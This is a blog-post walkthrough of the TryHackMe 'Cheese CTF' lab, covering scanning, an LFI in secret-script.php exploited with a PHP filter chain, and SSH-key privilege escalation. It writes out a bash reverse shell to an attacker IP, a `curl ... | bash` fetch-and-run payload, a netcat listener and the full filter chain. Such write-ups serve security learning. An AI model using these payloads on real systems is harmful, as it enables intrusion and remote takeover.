---
layout: post
title:  "TryHackMe: Cheese CTF"
description: Inspired by the great cheese talk of THM!
date:   2024-08-10 22:53:59 +0100
categories: jekyll update
---

# Cheese CTF:

```sh
export IP= M-ip
```
# Enumeration:

```sh
sudo nmap -sS -sC -sV -vv $IP
```
It's clear that the machine is using port spoofing to create decoy services by opening multiple fake ports. This makes it look like various services are running, which is intended to confuse us and make it harder to identify which port is legitimate.

<details>
  <summary><i>Nmap Discoverd Ports</i></summary>
  <pre>
Discovered open port 143/tcp on 10.10.10.247
Discovered open port 139/tcp on 10.10.10.247
Discovered open port 111/tcp on 10.10.10.247
Discovered open port 995/tcp on 10.10.10.247
Discovered open port 53/tcp on 10.10.10.247
Discovered open port 3389/tcp on 10.10.10.247
Discovered open port 554/tcp on 10.10.10.247
Discovered open port 5900/tcp on 10.10.10.247
Discovered open port 445/tcp on 10.10.10.247
Discovered open port 1720/tcp on 10.10.10.247
Discovered open port 110/tcp on 10.10.10.247
Discovered open port 587/tcp on 10.10.10.247
Discovered open port 8080/tcp on 10.10.10.247
Discovered open port 21/tcp on 10.10.10.247
Discovered open port 22/tcp on 10.10.10.247
Discovered open port 1723/tcp on 10.10.10.247
Discovered open port 80/tcp on 10.10.10.247
Discovered open port 1025/tcp on 10.10.10.247
Discovered open port 993/tcp on 10.10.10.247
Discovered open port 3306/tcp on 10.10.10.247
Discovered open port 5544/tcp on 10.10.10.247
Discovered open port 2222/tcp on 10.10.10.247
Discovered open port 2007/tcp on 10.10.10.247
Discovered open port 3322/tcp on 10.10.10.247
Discovered open port 7402/tcp on 10.10.10.247
Discovered open port 1078/tcp on 10.10.10.247
Discovered open port 3013/tcp on 10.10.10.247
Discovered open port 545/tcp on 10.10.10.247
Discovered open port 8093/tcp on 10.10.10.247
Discovered open port 8010/tcp on 10.10.10.247
Discovered open port 60020/tcp on 10.10.10.247
Discovered open port 9003/tcp on 10.10.10.247
Discovered open port 25/tcp on 10.10.10.247
Discovered open port 6881/tcp on 10.10.10.247
Discovered open port 32775/tcp on 10.10.10.247
Discovered open port 1169/tcp on 10.10.10.247
Discovered open port 5989/tcp on 10.10.10.247
Discovered open port 3005/tcp on 10.10.10.247
Discovered open port 8042/tcp on 10.10.10.247
Discovered open port 49159/tcp on 10.10.10.247
Discovered open port 2135/tcp on 10.10.10.247
Discovered open port 11110/tcp on 10.10.10.247
Discovered open port 8701/tcp on 10.10.10.247
Discovered open port 8193/tcp on 10.10.10.247
Discovered open port 2394/tcp on 10.10.10.247
Discovered open port 5631/tcp on 10.10.10.247
Discovered open port 199/tcp on 10.10.10.247
Discovered open port 90/tcp on 10.10.10.247
Discovered open port 4445/tcp on 10.10.10.247
Discovered open port 1032/tcp on 10.10.10.247
Discovered open port 1009/tcp on 10.10.10.247
Discovered open port 25734/tcp on 10.10.10.247
Discovered open port 5850/tcp on 10.10.10.247
Discovered open port 1812/tcp on 10.10.10.247
Discovered open port 443/tcp on 10.10.10.247
Discovered open port 1030/tcp on 10.10.10.247
Discovered open port 3527/tcp on 10.10.10.247
Discovered open port 2033/tcp on 10.10.10.247
Discovered open port 1152/tcp on 10.10.10.247
Discovered open port 23/tcp on 10.10.10.247
Discovered open port 8083/tcp on 10.10.10.247
Discovered open port 8888/tcp on 10.10.10.247
Discovered open port 113/tcp on 10.10.10.247
Discovered open port 135/tcp on 10.10.10.247
Discovered open port 256/tcp on 10.10.10.247
Discovered open port 1334/tcp on 10.10.10.247
Discovered open port 1192/tcp on 10.10.10.247
Discovered open port 1322/tcp on 10.10.10.247
Discovered open port 32772/tcp on 10.10.10.247
Discovered open port 3052/tcp on 10.10.10.247
Discovered open port 32781/tcp on 10.10.10.247
Discovered open port 27356/tcp on 10.10.10.247
Discovered open port 5414/tcp on 10.10.10.247
Discovered open port 19350/tcp on 10.10.10.247
Discovered open port 808/tcp on 10.10.10.247
Discovered open port 1687/tcp on 10.10.10.247
Discovered open port 9575/tcp on 10.10.10.247
Discovered open port 2035/tcp on 10.10.10.247
Discovered open port 6009/tcp on 10.10.10.247
Discovered open port 50001/tcp on 10.10.10.247
Discovered open port 2909/tcp on 10.10.10.247
Discovered open port 801/tcp on 10.10.10.247
Discovered open port 10617/tcp on 10.10.10.247
Discovered open port 1875/tcp on 10.10.10.247
Discovered open port 38292/tcp on 10.10.10.247
Discovered open port 514/tcp on 10.10.10.247
Discovered open port 2701/tcp on 10.10.10.247
Discovered open port 7999/tcp on 10.10.10.247
Discovered open port 22939/tcp on 10.10.10.247
Discovered open port 1033/tcp on 10.10.10.247
Discovered open port 8008/tcp on 10.10.10.247
Discovered open port 1198/tcp on 10.10.10.247
Discovered open port 2381/tcp on 10.10.10.247
Discovered open port 44442/tcp on 10.10.10.247
Discovered open port 50002/tcp on 10.10.10.247
Discovered open port 3914/tcp on 10.10.10.247
Discovered open port 5225/tcp on 10.10.10.247
Discovered open port 5800/tcp on 10.10.10.247
Discovered open port 2008/tcp on 10.10.10.247
Discovered open port 5862/tcp on 10.10.10.247
Discovered open port 2009/tcp on 10.10.10.247
Discovered open port 8400/tcp on 10.10.10.247
Discovered open port 5033/tcp on 10.10.10.247
Discovered open port 2910/tcp on 10.10.10.247
Discovered open port 10004/tcp on 10.10.10.247
Discovered open port 2260/tcp on 10.10.10.247
Discovered open port 990/tcp on 10.10.10.247
Discovered open port 8085/tcp on 10.10.10.247
Discovered open port 777/tcp on 10.10.10.247
Discovered open port 37/tcp on 10.10.10.247
Discovered open port 8086/tcp on 10.10.10.247
Discovered open port 9898/tcp on 10.10.10.247
Discovered open port 3889/tcp on 10.10.10.247
Discovered open port 616/tcp on 10.10.10.247
Discovered open port 1096/tcp on 10.10.10.247
Discovered open port 7443/tcp on 10.10.10.247
Discovered open port 24/tcp on 10.10.10.247
Discovered open port 6156/tcp on 10.10.10.247
Discovered open port 9080/tcp on 10.10.10.247
Discovered open port 1296/tcp on 10.10.10.247
Discovered open port 2100/tcp on 10.10.10.247
Discovered open port 2607/tcp on 10.10.10.247
Discovered open port 1038/tcp on 10.10.10.247
Discovered open port 1174/tcp on 10.10.10.247
Discovered open port 42/tcp on 10.10.10.247
Discovered open port 2045/tcp on 10.10.10.247
Discovered open port 1783/tcp on 10.10.10.247
</pre>
</details>

# Directory bruteforcing:


```sh
gobuster dir --url http://$IP/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,txt
```

```sh
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 1759]
/images               (Status: 301) [Size: 313] [--> http://10.10.10.247/images/]
/login.php            (Status: 200) [Size: 834]
/users.html           (Status: 200) [Size: 377]
/messages.html        (Status: 200) [Size: 448]
/orders.html          (Status: 200) [Size: 380]
```

we found that the /messages.html contain 

![Screenshot_9](https://github.com/user-attachments/assets/554342de-9602-4fa1-98f5-ae13da327c3d)

we got a Local File Inclusion (LFI) on /secret-script.php?file=php://filter/resource=/etc/passwd  

PHP applications that allow user input to dictate file handling without proper validation.

![Screenshot_1](https://github.com/user-attachments/assets/3ec570d3-e484-4258-be23-cc2f3683be2b)


# initial access : 

I used php filter chain generator . 

https://github.com/synacktiv/php_filter_chain_generator


```sh
echo "bash -i >& /dev/tcp/10.9.1.54/4444 0>&1" > shell
```
<?= ... ?>: This is PHP's shorthand for <?php echo ... ?>, which means it will output or "echo" whatever is inside the tags.

```sh
python3 php_filter_chain_generator.py --chain '<?= `curl -s -L 10.9.1.54/shell|bash` ?>'
```

<details>
  <summary><i>Output</i></summary>
  <pre>
+] The following gadget chain will generate the following code : <?= `curl -s -L 10.9.1.54/shell|bash` ?> (base64 value: PD89IGBjdXJsIC1zIC1MIDEwLjkuMS41NC9yZXZzaGVsbGx8YmFzaGAgPz4)
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp
  </pre>
</details>


```sh
Attacker Machine 

sudo python3 -m http.server 80
```
```sh
Attacker Machine

nc -lvnp 4444
```

```sh
http://10.10.237.45/secret-script.php?file=PHP-FILTER-CHAIN'Output'
```

![Screenshot_2](https://github.com/user-attachments/assets/b8796269-e663-4402-8c9b-cce01cc4b6c3)

After we apply the PHP filter chain to the vulnerable Local File Inclusion (LFI), the reverse shell script will be downloaded to the victim machine and executed. This happens by using the curl command to fetch the shell script from our remote server, and then piping it directly into Bash for execution, giving us remote access to the target system.

# Privilege escalation:

After further enumeration, I discovered that I have write access to the authorized_keys file in the .ssh directory.

```sh
Attacker Machine

ssh-keygen -t rsa

ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC0O0JSsJWhGHQDI1wEqoTZapMiec+9x/FzqM2Ys2+9o8U1RQEp6zHWMVzjGDFSGDSJGDJLKQSJKCJLQKb5iA+mZSagNEHIXn906gQW2/z3hpojwsDTLiEzdEPh+66q28LHFL0FuUmNvslkjmlkcdnhCKUklmdjsq?XCLMW?QLKSFJKDBSJKBdnszfjheafhjvdxqhcvbqvcygfavguvcshjwbcnsbhfsfsojfdsE7NCxFoKcl9MeMyNYPZB4WzRjXStQfF9XyuvhrI+C6VLoWiL11N2owozGhssA/1/hpEjDWJwMe0/7QcYYjTJ2IOJFDSKLNFSDHFDFSDlxWv/zINKv5EttAFyrTtO2pydh3wd5GaC8se0= kali@attacker_machine
```
```sh
Victim Machine

echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC0O0JSsJWhGHQDI1wEqoTZapMiec+9x/FzqM2Ys2+9o8U1RQEp6zHWMVzjGDFSGDSJGDJLKQSJKCJLQKb5iA+mZSagNEHIXn906gQW2/z3hpojwsDTLiEzdEPh+66q28LHFL0FuUmNvslkjmlkcdnhCKUklmdjsq?XCLMW?QLKSFJKDBSJKBdnszfjheafhjvdxqhcvbqvcygfavguvcshjwbcnsbhfsfsojfdsE7NCxFoKcl9MeMyNYPZB4WzRjXStQfF9XyuvhrI+C6VLoWiL11N2owozGhssA/1/hpEjDWJwMe0/7QcYYjTJ2IOJFDSKLNFSDHFDFSDlxWv/zINKv5EttAFyrTtO2pydh3wd5GaC8se0= kali@attacker_machine" > authorized_keys
```
```sh
Attacker Machine

chmod 600 id_rsa

ssh -i id_rsa  comte@10.10.122.229
```

![Screenshot_3](https://github.com/user-attachments/assets/2d798fae-caf9-4243-b251-08a218e826f7)

